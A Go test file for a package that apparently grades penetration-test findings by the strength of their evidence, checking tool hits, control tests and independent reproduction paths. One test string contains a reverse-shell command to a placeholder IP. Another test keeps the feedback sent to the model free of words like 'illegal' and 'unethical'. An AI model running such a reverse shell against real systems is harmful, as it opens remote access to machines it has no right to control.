package findinggate

import (
	"regexp"
	"strings"
	"testing"
)

func TestDecide_Table(t *testing.T) {
	reasons := []string{"grounding 未过：没有任何证据文本", "negation 未过：没有对照组"}
	joined := JoinReasons(reasons)
	if joined == "" {
		t.Fatal("precondition: joined reasons should not be empty")
	}

	type row struct {
		action Action
		flag   bool // 期望带 SummaryPrefix / EvidenceSuffix
	}
	table := map[Mode]map[string]row{
		ModeOff: {
			"verified": {ActStore, false},
			"inferred": {ActStore, false},
			"rejected": {ActStore, false},
		},
		ModeInfer: {
			"verified": {ActStore, false},
			"inferred": {ActStoreFlagged, true},
			"rejected": {ActToFact, false},
		},
		ModeStrict: {
			"verified": {ActStore, false},
			"inferred": {ActReject, false},
			"rejected": {ActToFact, false},
		},
	}

	modes := []Mode{ModeOff, ModeInfer, ModeStrict}
	levels := []string{"verified", "inferred", "rejected"}
	cells := 0
	for _, m := range modes {
		for _, lv := range levels {
			want, ok := table[m][lv]
			if !ok {
				t.Fatalf("table missing %s/%s", m, lv)
			}
			cells++
			got := Decide(m, lv, reasons)
			if got.Action != want.action {
				t.Errorf("mode=%s level=%s: action=%q want %q", m, lv, got.Action, want.action)
			}
			if want.flag {
				if got.SummaryPrefix != SummaryFlag {
					t.Errorf("mode=%s level=%s: summary_prefix=%q want %q", m, lv, got.SummaryPrefix, SummaryFlag)
				}
				wantSuffix := "\n\n" + EvidenceTag + joined
				if got.EvidenceSuffix != wantSuffix {
					t.Errorf("mode=%s level=%s: evidence_suffix=%q want %q", m, lv, got.EvidenceSuffix, wantSuffix)
				}
				if !strings.HasPrefix(got.EvidenceSuffix, "\n\n[gate:inferred] ") {
					t.Errorf("mode=%s level=%s: evidence_suffix lacks tag: %q", m, lv, got.EvidenceSuffix)
				}
			} else {
				if got.SummaryPrefix != "" {
					t.Errorf("mode=%s level=%s: unexpected summary_prefix %q", m, lv, got.SummaryPrefix)
				}
				if got.EvidenceSuffix != "" {
					t.Errorf("mode=%s level=%s: unexpected evidence_suffix %q", m, lv, got.EvidenceSuffix)
				}
			}
			if got.Message != "" && !strings.ContainsAny(got.Message, "。；") {
				t.Errorf("mode=%s level=%s: message looks truncated: %q", m, lv, got.Message)
			}
		}
	}
	if cells != 9 {
		t.Fatalf("expected 9 cells, got %d", cells)
	}

	// 三档语义必须真的不同，否则表就是空的。
	if Decide(ModeOff, "rejected", reasons).Action == Decide(ModeInfer, "rejected", reasons).Action {
		t.Error("off and infer should differ on rejected")
	}
	if Decide(ModeInfer, "inferred", reasons).Action == Decide(ModeStrict, "inferred", reasons).Action {
		t.Error("infer and strict should differ on inferred")
	}
}

func TestDecide_UnknownLevelFallsBackToRejected(t *testing.T) {
	reasons := []string{"evidence 为空"}
	for _, m := range []Mode{ModeOff, ModeInfer, ModeStrict, Mode("bogus"), ""} {
		want := Decide(m, "rejected", reasons)
		for _, lv := range []string{"", "  ", "VERIFIED?", "pass", "unknown", "可能"} {
			got := Decide(m, lv, reasons)
			if got != want {
				t.Errorf("mode=%q level=%q: got %+v want %+v", m, lv, got, want)
			}
		}
	}

	// 归一：大小写 + 空白。
	if got := Decide(ModeInfer, "  VERIFIED ", reasons).Action; got != ActStore {
		t.Errorf("VERIFIED should normalize to store, got %q", got)
	}
	if got := Decide(ModeInfer, "InFeRrEd", reasons).Action; got != ActStoreFlagged {
		t.Errorf("InFeRrEd should normalize to store_flagged, got %q", got)
	}

	// 空 reasons 也要给出可用文案，不能出现空括号。
	for _, m := range []Mode{ModeInfer, ModeStrict} {
		d := Decide(m, "rejected", nil)
		if d.Message == "" {
			t.Errorf("mode=%s: rejected message must not be empty", m)
		}
		if strings.Contains(d.Message, "（）") || strings.Contains(d.Message, "：。") {
			t.Errorf("mode=%s: empty reasons produced broken message: %q", m, d.Message)
		}
	}
	if d := Decide(ModeStrict, "inferred", nil); d.Message == "" || strings.Contains(d.Message, "（）") {
		t.Errorf("strict/inferred empty reasons message: %q", d.Message)
	}
}

var forbiddenWords = regexp.MustCompile(`禁止|不允许|无权限|违法|不道德`)

func TestDecide_MessageHasNoForbiddenWords(t *testing.T) {
	reasonSets := [][]string{
		nil,
		{},
		{""},
		{"grounding 未过：没有任何证据文本"},
		{"grounding 未过：证据太短", "negation 未过：没有对照组", "interrogation 未过：P3+ 需要独立路径复现", "第四条应被截断"},
	}
	modes := []Mode{ModeOff, ModeInfer, ModeStrict, Mode("weird"), ""}
	levels := []string{"verified", "inferred", "rejected", "", "bogus", "VERIFIED", "Inferred"}

	checked := 0
	for _, m := range modes {
		for _, lv := range levels {
			for _, rs := range reasonSets {
				d := Decide(m, lv, rs)
				checked++
				if loc := forbiddenWords.FindStringIndex(d.Message); loc != nil {
					t.Errorf("mode=%q level=%q: forbidden word %q in message: %q",
						m, lv, d.Message[loc[0]:loc[1]], d.Message)
				}
			}
		}
	}
	// 这些旁证提示也会被拼进回给模型的文案里，一并守住。
	for _, hint := range []string{
		ControlHint(false, ""),
		ControlHint(true, ""),
		ControlHint(true, "同入口去掉 payload，返回 200 且无差异"),
	} {
		checked++
		if loc := forbiddenWords.FindStringIndex(hint); loc != nil {
			t.Errorf("control hint has forbidden word %q: %q", hint[loc[0]:loc[1]], hint)
		}
	}
	if checked == 0 {
		t.Fatal("no messages checked")
	}
}

func TestParseMode(t *testing.T) {
	cases := []struct {
		in   string
		want Mode
	}{
		{"", ModeInfer},
		{"STRICT", ModeStrict},
		{"off ", ModeOff},
		{"bogus", ModeInfer},
		{"  Off\n", ModeOff},
		{"Infer", ModeInfer},
		{" infer ", ModeInfer},
		{"strict", ModeStrict},
	}
	for _, c := range cases {
		if got := ParseMode(c.in); got != c.want {
			t.Errorf("ParseMode(%q)=%q want %q", c.in, got, c.want)
		}
	}
}

func TestToolVerifiedFromEvidence(t *testing.T) {
	hits := []string{
		"nuclei -t cves/ -u http://x 命中 CVE-2018-20062",
		"通过 OAST 收到 DNS 查询",
		"dnslog 平台回显 xxxx.dnslog.cn",
		"interactsh 记录到一次交互",
		"callback 收到带 token 的请求",
		"payload 触发回连：bash -i >& /dev/tcp/1.2.3.4/443",
		"NUCLEI 模板命中（大小写不敏感）",
		"Interactsh-Client 日志",
	}
	for _, ev := range hits {
		if !ToolVerifiedFromEvidence(ev) {
			t.Errorf("expected true for %q", ev)
		}
	}
	misses := []string{
		"",
		"   ",
		"GET /admin HTTP/1.1 → 200 OK",
		"ThinkPHP 5.0.23 存在 CVE-2018-20062",
		"响应多了 300ms，疑似注入",
	}
	for _, ev := range misses {
		if ToolVerifiedFromEvidence(ev) {
			t.Errorf("expected false for %q", ev)
		}
	}
}

func TestIndependentFromEvidence(t *testing.T) {
	cases := []struct {
		name string
		ev   string
		want bool
	}{
		{"empty", "", false},
		{"blank", "   \n\t ", false},

		{"single method single path", "GET /admin/index.php?id=1 HTTP/1.1\nHost: t", false},
		{"single method single path with version tail", "POST /rest/user/login HTTP/1.1\nHost: t\n\n{...}", false},

		{"two methods", "GET /admin HTTP/1.1\nPOST /admin HTTP/1.1", true},
		{"two methods lower-case", "get /a\npatch /a", true},
		{"two methods inside long evidence",
			"先 curl -X POST http://t/rest/user/login\n然后 GET http://t/rest/user/1", true},

		{"two paths", "GET /a/b HTTP/1.1\nGET /a/c HTTP/1.1", true},
		{"two paths different host", "GET https://h1/api/x\nGET https://h2/api/y", true},
		{"two paths same path different host", "GET https://h1/api/x\nGET https://h2/api/x", false},

		{"one long url counts as one path", "GET https://example.com/a/b/c/d/e/f?x=1 HTTP/1.1", false},
		{"one long url with port and query", "POST https://example.com:8443/api/v1/users/1/items?id=2 HTTP/1.1", false},

		{"same path twice", "GET /admin\nGET /admin", false},
		{"root only", "GET / HTTP/1.1", false},
		{"word containing method letters", "TARGET GATEWAY DELETED 已就绪", false},
	}
	for _, c := range cases {
		if got := IndependentFromEvidence(c.ev); got != c.want {
			t.Errorf("%s: IndependentFromEvidence(%q)=%v want %v", c.name, c.ev, got, c.want)
		}
	}
}

func TestControlHint(t *testing.T) {
	if h := ControlHint(true, "同入口去掉 payload，返回 200 且无差异"); h != "" {
		t.Errorf("control tested should yield empty hint, got %q", h)
	}
	if h := ControlHint(true, ""); h != "" {
		t.Errorf("control tested (no note) should yield empty hint, got %q", h)
	}
	h := ControlHint(false, "")
	if h == "" {
		t.Fatal("no control should yield a hint")
	}
	if !strings.Contains(h, "对照") {
		t.Errorf("hint should mention 对照: %q", h)
	}
	if h2 := ControlHint(false, "ignored"); h2 != h {
		t.Errorf("hint should be independent of note when control was not run: %q vs %q", h2, h)
	}
}

func TestJoinReasons(t *testing.T) {
	cases := []struct {
		name string
		in   []string
		want string
	}{
		{"nil", nil, ""},
		{"empty slice", []string{}, ""},
		{"all blank", []string{"", "   ", "\n\t"}, ""},
		{"single", []string{"a"}, "a"},
		{"duplicates", []string{"a", "a", "a"}, "a"},
		{"duplicates with spaces", []string{"a", " a ", "a  "}, "a"},
		{"blanks between", []string{"a", "", "b"}, "a；b"},
		{"over 3", []string{"a", "b", "c", "d", "e"}, "a；b；c"},
		{"over 3 with dup and blank", []string{"a", "", "b", "a", "c", "d"}, "a；b；c"},
		{"trim kept", []string{"  grounding 未过  ", "negation 未过"}, "grounding 未过；negation 未过"},
	}
	for _, c := range cases {
		if got := JoinReasons(c.in); got != c.want {
			t.Errorf("%s: JoinReasons(%q)=%q want %q", c.name, c.in, got, c.want)
		}
	}
}

func TestDecide_StoreFlaggedSuffixUsesJoinedReasons(t *testing.T) {
	rs := []string{"negation 未过：没有对照组", "negation 未过：没有对照组", "", "grounding 未过：证据太短"}
	d := Decide(ModeInfer, "inferred", rs)
	if d.Action != ActStoreFlagged {
		t.Fatalf("action=%q", d.Action)
	}
	if got, want := d.EvidenceSuffix, "\n\n[gate:inferred] negation 未过：没有对照组；grounding 未过：证据太短"; got != want {
		t.Errorf("evidence suffix=%q want %q", got, want)
	}
	if strings.Count(d.EvidenceSuffix, EvidenceTag) != 1 {
		t.Errorf("evidence suffix should carry exactly one tag: %q", d.EvidenceSuffix)
	}
	if strings.Contains(d.SummaryPrefix, "\n") {
		t.Errorf("summary prefix must stay single-line: %q", d.SummaryPrefix)
	}
}

// 2026-10-22：日期被当成路径 → "两条独立路径复现"这一门（门 3）被白送。
// 门 3 是唯一能证明"这个结论不是一次性巧合"的证据，不能有这种后门。
func TestIndependentFromEvidenceRejectsDates(t *testing.T) {
	notIndependent := []string{
		"2024/01/02 与 2024/03/04 两次抓包都看到该响应头",
		"对比 2026/10/22 和 2026/10/23 的记录，响应一致",
		"版本 v1.1 与 3.2.1 都存在相同缺陷",
		"1/2 与 3/4 两条记录",
	}
	for _, ev := range notIndependent {
		if IndependentFromEvidence(ev) {
			t.Errorf("IndependentFromEvidence(%q)=true，日期/版本不该算独立路径", ev)
		}
	}

	independent := []string{
		"GET /api/order/detail?id=1002 返回 B 的手机号\nGET /api/user/info?uid=1002 返回同样数据",
		"GET /admin/list 200\nPOST /admin/export 200",
		"POST /index.php?s=captcha 回显 uid=33\nGET /public/index.php?s=captcha 同样回显",
	}
	for _, ev := range independent {
		if !IndependentFromEvidence(ev) {
			t.Errorf("IndependentFromEvidence(%q)=false，应判为独立复现", ev)
		}
	}

	// 只有方法词、没有路径：不算复现
	if IndependentFromEvidence("我 get 和 post 都试过了，都返回 200") {
		t.Error("只有方法词出现在散文里，不该算独立复现")
	}
}
